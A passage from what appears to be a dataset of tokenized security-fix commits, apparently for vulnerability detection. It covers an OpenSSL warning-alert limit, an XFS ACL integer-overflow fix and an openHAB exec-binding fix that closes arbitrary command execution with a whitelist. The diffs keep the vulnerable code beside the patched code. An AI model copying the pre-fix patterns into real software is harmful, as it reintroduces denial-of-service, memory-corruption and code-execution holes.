"int", "type", ",", "int", "*", "recvd_type", ",", "unsigned", "char", "*", "buf", ",", "if", "(", "alert_level", "=", "=", "SSL3_AL_WARNING", ")", "{", "s", "-", ">", "s3", "-", ">", "warn_alert", "=", "alert_descr", ";", "SSL3_RECORD_set_read", "(", "rr", ")", ";", "s", "-", ">", "rlayer", ".", "alert_count", "+", "+;", "if", "(", "s", "-", ">", "rlayer", ".", "alert_count", "=", "=", "MAX_WARN_ALERT_COUNT", ")", "{", "al", "=", "SSL_AD_UNEXPECTED_MESSAGE", ";", "SSLerr", "(", "SSL_F_SSL3_READ_BYTES", ",", "SSL_R_TOO_MANY_WARN_ALERTS", ")", ";", "goto", "f_err", ";", "}", "if", "(", "alert_descr", "=", "=", "SSL_AD_CLOSE_NOTIFY", ")", "{", "s", "-", ">", "shutdown", "|", "=", "SSL_RECEIVED_SHUTDOWN", ";", "return", "(", "0", ")", ";", "@", "@", "-", "178", ",", "6", "+", "178", ",", "8", "@", "@", "typedef", "struct", "record_layer_st", "{", "unsigned", "char", "write_sequence", "[", "SEQ_NUM_SIZE", "]", ";", "/", "*", "Set", "to", "true", "if", "this", "is", "the", "first", "record", "in", "a", "connection", "*", "/", "unsigned", "int", "is_first_record", ";", "/", "*", "Count", "of", "the", "number", "of", "consecutive", "warning", "alerts", "received", "*", "/", "unsigned", "int", "alert_count", ";", "DTLS_RECORD_LAYER", "*", "d", ";", "}", "RECORD_LAYER", ";", "@", "@", "-", "14", ",", "6", "+", "14", ",", "8", "@", "@", "*", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "#", "define", "MAX_WARN_ALERT_COUNT", "5", "/", "*", "Functions", "/", "macros", "provided", "by", "the", "RECORD_LAYER", "component", "*", "/", "#", "define", "RECORD_LAYER_get_rbuf", "(", "rl", ")", "(", "&(", "rl", ")", "->", "rbuf", ")", "@", "@", "-", "617", ",", "6", "+", "617", ",", "7", "@", "@", "static", "ERR_STRING_DATA", "SSL_str_reasons", "[", "]", "=", "{", "\"", "tls", "illegal", "exporter", "label", "\"", "},", "{", "ERR_REASON", "(", "SSL_R_TLS_INVALID_ECPOINTFORMAT_LIST", ")", ",", "\"", "tls", "invalid", "ecpointformat", "list", "\"", "},", "{", "ERR_REASON", "(", "SSL_R_TOO_MANY_WARN_ALERTS", ")", ",", "\"", "too", "many", "warn", "alerts", "\"", "},", "{", "ERR_REASON", "(", "SSL_R_UNABLE_TO_FIND_ECDH_PARAMETERS", ")", ",", "\"", "unable", "to", "find", "ecdh", "parameters", "\"", "},", "{", "ERR_REASON", "(", "SSL_R_UNABLE_TO_FIND_PUBLIC_KEY_PARAMETERS", ")", ","], "docstring_tokens": ["of", "service"]}
{"contents": ["xfs:", "fix", "acl", "count", "validation", "in", "xfs_acl_from_disk()", "Commit", "fa8b18ed", "didn't", "prevent", "the", "integer", "overflow", "and", "possible", "memory", "corruption.", "\"count\"", "can", "go", "negative", "and", "bypass", "the", "check.", "Signed-off-by:", "Xi", "Wang", "<xi.wang@gmail.com>", "Reviewed-by:", "Christoph", "Hellwig", "<hch@lst.de>", "Signed-off-by:", "Ben", "Myers", "<bpm@sgi.com>"], "code_tokens": ["@", "@", "-", "39", ",", "7", "+", "39", ",", "7", "@", "@", "xfs_acl_from_disk", "(", "struct", "xfs_acl", "*", "aclp", ")", "struct", "posix_acl_entry", "*", "acl_e", ";", "struct", "posix_acl", "*", "acl", ";", "struct", "xfs_acl_entry", "*", "ace", ";", "int", "count", ",", "i", ";", "unsigned", "int", "count", ",", "i", ";", "count", "=", "be32_to_cpu", "(", "aclp", "-", ">", "acl_cnt", ")", ";", "if", "(", "count", ">", "XFS_ACL_MAX_ENTRIES", ")"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["Merge", "pull", "request", "from", "GHSA-w698-693g-23hv", "*", "fix", "arbitrary", "code", "execution", "vulnerability", "Signed-off-by:", "Jan", "N.", "Klug", "<jan.n.klug@rub.de>", "*", "Update", "bundles/org.openhab.binding.exec/src/main/java/org/openhab/binding/exec/internal/handler/ExecHandler.java", "Co-Authored-By:", "Christoph", "Weitkamp", "<github@christophweitkamp.de>", "*", "address", "review", "comments", "Signed-off-by:", "Jan", "N.", "Klug", "<jan.n.klug@rub.de>", "Co-authored-by:", "Christoph", "Weitkamp", "<github@christophweitkamp.de>"], "code_tokens": ["@", "@", "-", "8", ",", "8", "+", "8", ",", "17", "@", "@", "Currently", ",", "the", "binding", "supports", "a", "single", "type", "of", "Thing", ",", "being", "the", "`", "command", "`", "Thin", "#", "#", "Binding", "Configuration", "The", "binding", "does", "not", "require", "any", "specific", "configuration", ".", "For", "security", "reasons", "all", "commands", "need", "to", "be", "whitelisted", ".", "Allowed", "commands", "need", "to", "be", "added", "to", "the", "`", "misc", "/", "exec", ".", "whitelist", "`", "file", "in", "the", "configuration", "directory", ".", "Every", "command", "needs", "to", "be", "on", "a", "separate", "line", ".", "Example", ":", "`", "``", "shell", "/", "bin", "/", "echo", "\"", "Hello", "world", "!", "\"", "/", "usr", "/", "local", "/", "bin", "/", "apcaccess", "status", "php", ".", "/", "configurations", "/", "scripts", "/", "script", ".", "php", "%", "2", "$", "s", "`", "``", "*", "*", "Linux", ":", "**", "Note", "that", "the", "commands", "are", "executed", "in", "the", "context", "and", "with", "the", "privileges", "of", "the", "process", "running", "the", "Java", "Virtual", "Machine", ".", "@", "@", "-", "27", ",", "7", "+", "36", ",", "6", "@", "@", "It", "is", "not", "advised", "to", "run", "the", "virtual", "machine", "as", "superuser", "/", "root", ".", "The", "\"", "command", "\"", "Thing", "requires", "the", "command", "to", "execute", "on", "the", "shell", ".", "Optionally", "one", "can", "specify", ":", "-", "`", "transform", "`", "-", "A", "[", "transformation", "]", "(", "https", ":", "//", "www", ".", "openhab", ".", "org", "/", "docs", "/", "configuration", "/", "transformations", ".", "html", ")", "to", "apply", "on", "the", "execution", "result", "string", ".", "-", "`", "interval", "`", "-", "An", "interval", ",", "in", "seconds", ",", "the", "command", "will", "be", "repeatedly", "executed", ".", "Default", "is", "60", "seconds", ",", "set", "to", "0", "to", "avoid", "automatic", "repetition", ".", "-", "`", "timeout", "`", "-", "A", "time", "-", "out", ",", "in", "seconds", ",", "the", "execution", "of", "the", "command", "will", "time", "out", ",", "and", "lastly", ",", "@", "@", "-", "39", ",", "7", "+", "47", ",", "6", "@", "@", "For", "each", "shell", "command", ",", "a", "separate", "Thing", "has", "to", "be", "defined", ".", "Thing", "exec", ":", "command", ":", "uniquename", "[", "command", "=", "\"/", "command", "/", "to", "/", "execute", "here", "\"", ",", "interval", "=", "15", ",", "timeout", "=", "5", ",", "autorun", "=", "false", "]", "`", "``", "The", "`", "command", "`", "itself", "can", "be", "enhanced", "using", "the", "well", "known", "syntax", "of", "the", "[", "Java", "formatter", "class", "syntax", "]", "(", "https", ":", "//", "docs", ".", "oracle", ".", "com", "/", "javase", "/", "8", "/", "docs", "/", "api", "/", "java", "/", "util", "/", "Formatter", ".", "html", "#", "syntax", ")", ".", "The", "following", "parameters", "are", "automatically", "added", ":", "@", "@", "-", "13", ",", "17", "+", "13", ",", "19", "@", "@", "package", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "config", ".", "core", ".", "ConfigConstants", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "ThingTypeUID", ";", "import", "java", ".", "io", ".", "File", ";", "/", "**", "*", "The", "{", "@", "link", "ExecBinding", "}", "class", "defines", "common", "constants", ",", "which", "are", "*", "The", "{", "@", "link", "ExecBindingConstants", "}", "class", "defines", "common", "constants", ",", "which", "are", "*", "used", "across", "the", "whole", "binding", ".", "*", "*", "@", "author", "Karel", "Goderis", "-", "Initial", "contribution", "*", "/", "@", "NonNullByDefault", "public", "class", "ExecBindingConstants", "{", "public", "static", "final", "String", "BINDING_ID", "=", "\"", "exec", "\"", ";", "/", "/", "List", "of", "all", "Thing", "Type", "UIDs", "@", "@", "-", "35", ",", "5", "+", "37", ",", "4", "@", "@", "public", "static", "final", "String", "EXIT", "=", "\"", "exit", "\"", ";", "public", "static", "final", "String", "RUN", "=", "\"", "run", "\"", ";", "public", "static", "final", "String", "LAST_EXECUTION", "=", "\"", "lastexecution", "\"", ";", "}", "@", "@", "-", "12", ",", "11", "+", "12", ",", "6", "@", "@", "*", "/", "package", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ";", "import", "static", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "ExecBindingConstants", ".", "THING_COMMAND", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "Nullable", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "Thing", ";", "@", "@", "-", "25", ",", "7", "+", "20", ",", "16", "@", "@", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "binding", ".", "ThingHandler", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "thing", ".", "binding", ".", "ThingHandlerFactory", ";", "import", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "handler", ".", "ExecHandler", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Activate", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Component", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Reference", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "ExecBindingConstants", ".", "THING_COMMAND", ";", "/", "**", "*", "The", "{", "@", "link", "ExecHandlerFactory", "}", "is", "responsible", "for", "creating", "things", "and", "thing", "@", "@", "-", "36", ",", "8", "+", "40", ",", "14", "@", "@", "@", "NonNullByDefault", "@", "Component", "(", "service", "=", "ThingHandlerFactory", ".", "class", ",", "configurationPid", "=", "\"", "binding", ".", "exec", "\"", ")", "public", "class", "ExecHandlerFactory", "extends", "BaseThingHandlerFactory", "{", "private", "static", "final", "Set", "<", "ThingTypeUID", ">", "SUPPORTED_THING_TYPES_UIDS", "=", "Collections", ".", "singleton", "(", "THING_COMMAND", ")", ";", "private", "final", "Logger", "logger", "=", "LoggerFactory", ".", "getLogger", "(", "ExecHandlerFactory", ".", "class", ")", ";", "private", "final", "ExecWhitelistWatchService", "execWhitelistWatchService", ";", "@", "Activate", "public", "ExecHandlerFactory", "(", "@", "Reference", "ExecWhitelistWatchService", "execWhitelistWatchService", ")", "{", "this", ".", "execWhitelistWatchService", "=", "execWhitelistWatchService", ";", "}", "@", "Override", "public", "boolean", "supportsThingType", "(", "ThingTypeUID", "thingTypeUID", ")", "{", "@", "@", "-", "49", ",", "7", "+", "59", ",", "7", "@", "@", "public", "boolean", "supportsThingType", "(", "ThingTypeUID", "thingTypeUID", ")", "{", "ThingTypeUID", "thingTypeUID", "=", "thing", ".", "getThingTypeUID", "(", ");", "if", "(", "thingTypeUID", ".", "equals", "(", "THING_COMMAND", ")", ")", "{", "return", "new", "ExecHandler", "(", "thing", ")", ";", "return", "new", "ExecHandler", "(", "thing", ",", "execWhitelistWatchService", ")", ";", "}", "return", "null", ";", "@", "@", "-", "0", ",", "0", "+", "1", ",", "81", "@", "@", "/", "**", "*", "Copyright", "(", "c", ")", "2010", "-", "2020", "Contributors", "to", "the", "openHAB", "project", "*", "*", "See", "the", "NOTICE", "file", "(", "s", ")", "distributed", "with", "this", "work", "for", "additional", "*", "information", ".", "*", "*", "This", "program", "and", "the", "accompanying", "materials", "are", "made", "available", "under", "the", "*", "terms", "of", "the", "Eclipse", "Public", "License", "2", ".", "0", "which", "is", "available", "at", "*", "http", ":", "//", "www", ".", "eclipse", ".", "org", "/", "legal", "/", "epl", "-", "2", ".", "0", "*", "*", "SPDX", "-", "License", "-", "Identifier", ":", "EPL", "-", "2", ".", "0", "*", "/", "package", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "Nullable", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "config", ".", "core", ".", "ConfigConstants", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "service", ".", "AbstractWatchService", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Activate", ";", "import", "org", ".", "osgi", ".", "service", ".", "component", ".", "annotations", ".", "Component", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "nio", ".", "file", ".", "WatchEvent", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "static", "java", ".", "nio", ".", "file", ".", "StandardWatchEventKinds", ".", "*;", "/", "**", "*", "The", "{", "@", "link", "ExecWhitelistWatchService", "}", "provides", "a", "whitelist", "check", "for", "exec", "commands", "*", "*", "@", "author", "Jan", "N", ".", "Klug", "-", "Initial", "contribution", "*", "/", "@", "Component", "(", "service", "=", "ExecWhitelistWatchService", ".", "class", ")", "@", "NonNullByDefault", "public", "class", "ExecWhitelistWatchService", "extends", "AbstractWatchService", "{", "private", "static", "final", "String", "COMMAND_WHITELIST_PATH", "=", "ConfigConstants", ".", "getConfigFolder", "(", ")", "+", "File", ".", "separator", "+", "\"", "misc", "\"", ";", "private", "static", "final", "String", "COMMAND_WHITELIST_FILE", "=", "\"", "exec", ".", "whitelist", "\"", ";", "private", "final", "Set", "<", "String", ">", "commandWhitelist", "=", "new", "HashSet", "<", ">(", ");", "@", "Activate", "public", "ExecWhitelistWatchService", "(", ")", "{", "super", "(", "COMMAND_WHITELIST_PATH", ")", ";", "}", "@", "Override", "protected", "boolean", "watchSubDirectories", "(", ")", "{", "return", "false", ";", "}", "@", "Override", "protected", "WatchEvent", ".", "Kind", "<", "?>", "[]", "getWatchEventKinds", "(", "@", "Nullable", "Path", "directory", ")", "{", "return", "new", "WatchEvent", ".", "Kind", "<", "?>", "[]", "{", "ENTRY_CREATE", ",", "ENTRY_DELETE", ",", "ENTRY_MODIFY", "}", ";", "}", "@", "Override", "protected", "void", "processWatchEvent", "(", "@", "Nullable", "WatchEvent", "<", "?>", "event", ",", "WatchEvent", ".", "@", "Nullable", "Kind", "<", "?>", "kind", ",", "@", "Nullable", "Path", "path", ")", "{", "if", "(", "path", ".", "endsWith", "(", "COMMAND_WHITELIST_FILE", ")", ")", "{", "commandWhitelist", ".", "clear", "(", ");", "try", "{", "Files", ".", "lines", "(", "path", ")", ".", "forEach", "(", "commandWhitelist", ":", ":", "add", ")", ";", "logger", ".", "debug", "(", "\"", "Updated", "command", "whitelist", ":", "{", "}\"", ",", "commandWhitelist", ")", ";", "}", "catch", "(", "IOException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "Cannot", "read", "whitelist", "file", ",", "exec", "binding", "commands", "won", "'", "t", "be", "processed", ":", "{", "}\"", ",", "e", ".", "getMessage", "(", "))", ";", "}", "}", "}", "/", "**", "*", "Check", "if", "a", "command", "is", "whitelisted", "*", "*", "@", "param", "command", "the", "command", "to", "check", "alias", "*", "@", "return", "true", "if", "whitelisted", ",", "false", "if", "not", "*", "/", "public", "boolean", "isWhitelisted", "(", "String", "command", ")", "{", "return", "commandWhitelist", ".", "contains", "(", "command", ")", ";", "}", "}", "@", "@", "-", "12", ",", "22", "+", "12", ",", "6", "@", "@", "*", "/", "package", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "handler", ";", "import", "static", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "ExecBindingConstants", ".", "*;", "import", "java", ".", "io", ".", "BufferedReader", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStreamReader", ";", "import", "java", ".", "math", ".", "BigDecimal", ";", "import", "java", ".", "time", ".", "ZonedDateTime", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Calendar", ";", "import", "java", ".", "util", ".", "IllegalFormatException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ScheduledFuture", ";", "import", "java", ".", "util", ".", "concurrent", ".", "TimeUnit", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "java", ".", "util", ".", "regex", ".", "PatternSyntaxException", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "StringUtils", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "NonNullByDefault", ";", "import", "org", ".", "eclipse", ".", "jdt", ".", "annotation", ".", "Nullable", ";", "@", "@", "-", "44", ",", "17", "+", "28", ",", "35", "@", "@", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "transform", ".", "TransformationService", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "types", ".", "Command", ";", "import", "org", ".", "eclipse", ".", "smarthome", ".", "core", ".", "types", ".", "RefreshType", ";", "import", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "ExecWhitelistWatchService", ";", "import", "org", ".", "osgi", ".", "framework", ".", "BundleContext", ";", "import", "org", ".", "osgi", ".", "framework", ".", "FrameworkUtil", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "java", ".", "io", ".", "BufferedReader", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStreamReader", ";", "import", "java", ".", "math", ".", "BigDecimal", ";", "import", "java", ".", "time", ".", "ZonedDateTime", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Calendar", ";", "import", "java", ".", "util", ".", "IllegalFormatException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ScheduledFuture", ";", "import", "java", ".", "util", ".", "concurrent", ".", "TimeUnit", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "java", ".", "util", ".", "regex", ".", "PatternSyntaxException", ";", "import", "static", "org", ".", "openhab", ".", "binding", ".", "exec", ".", "internal", ".", "ExecBindingConstants", ".", "*;", "/", "**", "*", "The", "{", "@", "link", "ExecHandler", "}", "is", "responsible", "for", "handling", "commands", ",", "which", "are", "*", "sent", "to", "one", "of", "the", "channels", ".", "*", "*", "@", "author", "Karel", "Goderis", "-", "Initial", "contribution", "*", "@", "author", "Constantin", "Piber", "-", "Added", "better", "argument", "support", "(", "delimiter", "and", "pass", "to", "shell", ")", "*", "@", "author", "Jan", "N", ".", "Klug", "-", "Add", "command", "whitelist", "check", "*", "/", "@", "NonNullByDefault", "public", "class", "ExecHandler", "extends", "BaseThingHandler", "{", "@", "@", "-", "68", ",", "6", "+", "70", ",", "7", "@", "@", "*", "/", "public", "static", "final", "String", "[", "]", "SHELL_WINDOWS", "=", "new", "String", "[", "]", "{", "\"", "cmd", "\"", "}", ";", "public", "static", "final", "String", "[", "]", "SHELL_NIX", "=", "new", "String", "[", "]", "{", "\"", "sh", "\"", ",", "\"", "bash", "\"", ",", "\"", "zsh", "\"", ",", "\"", "csh", "\"", "}", ";", "private", "final", "ExecWhitelistWatchService", "execWhitelistWatchService", ";", "private", "Logger", "logger", "=", "LoggerFactory", ".", "getLogger", "(", "ExecHandler", ".", "class", ")", ";", "@", "@", "-", "88", ",", "9", "+", "91", ",", "10", "@", "@", "private", "static", "Runtime", "rt", "=", "Runtime", ".", "getRuntime", "(", ");", "public", "ExecHandler", "(", "Thing", "thing", ")", "{", "public", "ExecHandler", "(", "Thing", "thing", ",", "ExecWhitelistWatchService", "execWhitelistWatchService", ")", "{", "super", "(", "thing", ")", ";", "this", ".", "bundleContext", "=", "FrameworkUtil", ".", "getBundle", "(", "ExecHandler", ".", "class", ")", ".", "getBundleContext", "(", ");", "this", ".", "execWhitelistWatchService", "=", "execWhitelistWatchService", ";", "}", "@", "Override", "@", "@", "-", "101", ",", "18", "+", "105", ",", "18", "@", "@", "public", "void", "handleCommand", "(", "ChannelUID", "channelUID", ",", "Command", "command", ")", "{", "if", "(", "channelUID", ".", "getId", "(", ").", "equals", "(", "RUN", ")", ")", "{", "if", "(", "command", "instanceof", "OnOffType", ")", "{", "if", "(", "command", "=", "=", "OnOffType", ".", "ON", ")", "{", "scheduler", ".", "schedule", "(", "periodicExecutionRunnable", ",", "0", ",", "TimeUnit", ".", "SECONDS", ")", ";", "scheduler", ".", "schedule", "(", "this", ":", ":", "execute", ",", "0", ",", "TimeUnit", ".", "SECONDS", ")", ";", "}", "}", "}", "else", "if", "(", "channelUID", ".", "getId", "(", ").", "equals", "(", "INPUT", ")", ")", "{", "if", "(", "command", "instanceof", "StringType", ")", "{", "String", "previousInput", "=", "lastInput", ";", "lastInput", "=", "command", ".", "toString", "(", ");", "if", "(", "lastInput", "!", "=", "null", "&", "&", "!", "lastInput", ".", "equals", "(", "previousInput", ")", ")", "{", "if", "(", "getConfig", "(", ").", "get", "(", "AUTORUN", ")", "!", "=", "null", "&", "&", "(", "(", "Boolean", ")", "getConfig", "(", ").", "get", "(", "AUTORUN", ")", ").", "booleanValue", "(", "))", "{", "if", "(", "getConfig", "(", ").", "get", "(", "AUTORUN", ")", "!", "=", "null", "&", "&", "(", "(", "Boolean", ")", "getConfig", "(", ").", "get", "(", "AUTORUN", ")", "))", "{", "logger", ".", "trace", "(", "\"", "Executing", "command", "'", "{}", "'", "after", "a", "change", "of", "the", "input", "channel", "to", "'", "{}", "'\"", ",", "getConfig", "(", ").", "get", "(", "COMMAND", ")", ",", "lastInput", ")", ";", "scheduler", ".", "schedule", "(", "periodicExecutionRunnable", ",", "0", ",", "TimeUnit", ".", "SECONDS", ")", ";", "scheduler", ".", "schedule", "(", "this", ":", ":", "execute", ",", "0", ",", "TimeUnit", ".", "SECONDS", ")", ";", "}", "}", "}", "@", "@", "-", "123", ",", "11", "+", "127", ",", "10", "@", "@", "public", "void", "handleCommand", "(", "ChannelUID", "channelUID", ",", "Command", "command", ")", "{", "@", "Override", "public", "void", "initialize", "(", ")", "{", "if", "(", "executionJob", "=", "=", "null", "|", "|", "executionJob", ".", "isCancelled", "(", "))", "{", "if", "(", "((", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "INTERVAL", ")", ")", "!", "=", "null", "&", "&", "(", "(", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "INTERVAL", ")", ").", "intValue", "(", ")", ">", "0", ")", "{", "if", "(", "(", "getConfig", "(", ").", "get", "(", "INTERVAL", ")", ")", "!", "=", "null", "&", "&", "(", "(", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "INTERVAL", ")", ")", ".", "intValue", "(", ")", ">", "0", ")", "{", "int", "pollingInterval", "=", "(", "(", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "INTERVAL", ")", ").", "intValue", "(", ");", "executionJob", "=", "scheduler", ".", "scheduleWithFixedDelay", "(", "periodicExecutionRunnable", ",", "0", ",", "pollingInterval", ",", "TimeUnit", ".", "SECONDS", ")", ";", "executionJob", "=", "scheduler", ".", "scheduleWithFixedDelay", "(", "this", ":", ":", "execute", ",", "0", ",", "pollingInterval", ",", "TimeUnit", ".", "SECONDS", ")", ";", "}", "}", "@", "@", "-", "142", ",", "166", "+", "145", ",", "161", "@", "@", "public", "void", "dispose", "(", ")", "{", "}", "}", "protected", "Runnable", "periodicExecutionRunnable", "=", "new", "Runnable", "(", ")", "{", "public", "void", "execute", "(", ")", "{", "String", "commandLine", "=", "(", "String", ")", "getConfig", "(", ").", "get", "(", "COMMAND", ")", ";", "if", "(", "!", "execWhitelistWatchService", ".", "isWhitelisted", "(", "commandLine", ")", ")", "{", "logger", ".", "warn", "(", "\"", "Tried", "to", "execute", "'", "{}", "',", "but", "it", "is", "not", "contained", "in", "whitelist", ".", "\",", "commandLine", ")", ";", "return", ";", "}", "@", "Override", "public", "void", "run", "(", ")", "{", "String", "commandLine", "=", "(", "String", ")", "getConfig", "(", ").", "get", "(", "COMMAND", ")", ";", "int", "timeOut", "=", "60000", ";", "if", "(", "(", "getConfig", "(", ").", "get", "(", "TIME_OUT", ")", ")", "!", "=", "null", ")", "{", "timeOut", "=", "(", "(", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "TIME_OUT", ")", ").", "intValue", "(", ")", "*", "1000", ";", "}", "int", "timeOut", "=", "60000", ";", "if", "(", "((", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "TIME_OUT", ")", ")", "!", "=", "null", ")", "{", "timeOut", "=", "(", "(", "BigDecimal", ")", "getConfig", "(", ").", "get", "(", "TIME_OUT", ")", ").", "intValue", "(", ")", "*", "1000", ";", "}", "if", "(", "commandLine", "!", "=", "null", "&", "&", "!", "commandLine", ".", "isEmpty", "(", "))", "{", "updateState", "(", "RUN", ",", "OnOffType", ".", "ON", ")", ";", "if", "(", "commandLine", "!", "=", "null", "&", "&", "!", "commandLine", ".", "isEmpty", "(", "))", "{", "updateState", "(", "RUN", ",", "OnOffType", ".", "ON", ")", ";", "/", "/", "For", "some", "obscure", "reason", ",", "when", "using", "Apache", "Common", "Exec", ",", "or", "using", "a", "straight", "implementation", "of", "/", "/", "Runtime", ".", "Exec", "(", "),", "on", "Mac", "OS", "X", "(", "Yosemite", "and", "El", "Capitan", ")", ",", "there", "seems", "to", "be", "a", "lock", "race", "condition", "/", "/", "randomly", "appearing", "(", "on", "UNIXProcess", ")", "*", "when", "*", "one", "tries", "to", "gobble", "up", "the", "stdout", "and", "sterr", "output", "of", "the", "/", "/", "subprocess", "in", "separate", "threads", ".", "It", "seems", "to", "be", "common", "\"", "wisdom", "\"", "to", "do", "that", "in", "separate", "threads", ",", "but", "/", "/", "only", "when", "keeping", "everything", "between", ".", "exec", "(", ")", "and", ".", "waitfor", "(", ")", "in", "the", "same", "thread", ",", "this", "lock", "race", "/", "/", "condition", "seems", "to", "go", "away", ".", "This", "approach", "of", "not", "reading", "the", "outputs", "in", "separate", "threads", "*", "might", "*", "be", "a", "/", "/", "problem", "for", "external", "commands", "that", "generate", "a", "lot", "of", "output", ",", "but", "this", "will", "be", "dependent", "on", "the", "limits", "/", "/", "of", "the", "underlying", "operating", "system", ".", "/", "/", "For", "some", "obscure", "reason", ",", "when", "using", "Apache", "Common", "Exec", ",", "or", "using", "a", "straight", "implementation", "of", "/", "/", "Runtime", ".", "Exec", "(", "),", "on", "Mac", "OS", "X", "(", "Yosemite", "and", "El", "Capitan", ")", ",", "there", "seems", "to", "be", "a", "lock", "race", "condition", "/", "/", "randomly", "appearing", "(", "on", "UNIXProcess", ")", "*", "when", "*", "one", "tries", "to", "gobble", "up", "the", "stdout", "and", "sterr", "output", "of", "the", "/", "/", "subprocess", "in", "separate", "threads", ".", "It", "seems", "to", "be", "common", "\"", "wisdom", "\"", "to", "do", "that", "in", "separate", "threads", ",", "but", "/", "/", "only", "when", "keeping", "everything", "between", ".", "exec", "(", ")", "and", ".", "waitfor", "(", ")", "in", "the", "same", "thread", ",", "this", "lock", "race", "/", "/", "condition", "seems", "to", "go", "away", ".", "This", "approach", "of", "not", "reading", "the", "outputs", "in", "separate", "threads", "*", "might", "*", "be", "a", "/", "/", "problem", "for", "external", "commands", "that", "generate", "a", "lot", "of", "output", ",", "but", "this", "will", "be", "dependent", "on", "the", "limits", "/", "/", "of", "the", "underlying", "operating", "system", ".", "try", "{", "if", "(", "lastInput", "!", "=", "null", ")", "{", "commandLine", "=", "String", ".", "format", "(", "commandLine", ",", "Calendar", ".", "getInstance", "(", ").", "getTime", "(", "),", "lastInput", ")", ";", "}", "else", "{", "commandLine", "=", "String", ".", "format", "(", "commandLine", ",", "Calendar", ".", "getInstance", "(", ").", "getTime", "(", "))", ";", "}", "}", "catch", "(", "IllegalFormatException", "e", ")", "{", "logger", ".", "warn", "(", "\"", "An", "exception", "occurred", "while", "formatting", "the", "command", "line", "with", "the", "current", "time", "and", "input", "values", ":", "'", "{}", "'\"", ",", "e", ".", "getMessage", "(", "))", ";", "updateState", "(", "RUN", ",", "OnOffType", ".", "OFF", ")", ";", "updateState", "(", "OUTPUT", ",", "new", "StringType", "(", "e", ".", "getMessage", "(", "))", ");", "return", ";", "}", "String", "[", "]", "cmdArray", ";", "String", "[", "]", "shell", ";", "if", "(", "commandLine", ".", "contains", "(", "CMD_LINE_DELIMITER", ")", ")", "{", "logger", ".", "debug", "(", "\"", "Splitting", "by", "'", "{}", "'\"", ",", "CMD_LINE_DELIMITER", ")", ";", "try", "{", "if", "(", "lastInput", "!", "=", "null", ")", "{", "commandLine", "=", "String", ".", "format", "(", "commandLine", ",", "Calendar", ".", "getInstance", "(", ").", "getTime", "(", "),", "lastInput", ")", ";", "}", "else", "{", "commandLine", "=", "String", ".", "format", "(", "commandLine", ",", "Calendar", ".", "getInstance", "(", ").", "getTime", "(", "))", 